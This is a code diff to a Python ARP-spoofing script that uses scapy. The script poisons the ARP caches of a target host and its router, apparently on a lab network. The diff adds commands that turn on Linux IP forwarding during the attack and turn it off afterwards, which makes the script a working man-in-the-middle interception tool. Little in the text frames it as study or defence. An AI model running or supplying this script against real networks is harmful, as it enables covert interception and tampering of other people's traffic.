@@ -1,13 +1,12 @@
+import subprocess
+
 import scapy.all as scapy
 from time import sleep
 
 
 target = '10.0.2.9'
 router = '10.0.2.1'
-
-
-# # get all possible methods of scapy.ARP()
-# print(scapy.ls(scapy.ARP))
+ip_forwarding = 'echo {} > /proc/sys/net/ipv4/ip_forward'
 
 
 def get_mac(ip):
@@ -35,9 +34,9 @@ def restore(destination_ip, source_ip):
     scapy.send(packet, count=4, verbose=False)
 
 
-# keep spoofing as long as we need
 count = 2
 try:
+    subprocess.call(ip_forwarding.format('1'), shell=True)
     while True:
         print('\r[+] Packets sent:', count, end='')
         count += 2
@@ -48,3 +47,4 @@ except KeyboardInterrupt:
     print('\n[+] Detected CTRL+C... Restoring ARP tables. Please, wait...')
     restore(target, router)
     restore(router, target)
+    subprocess.call(ip_forwarding.format('0'), shell=True)
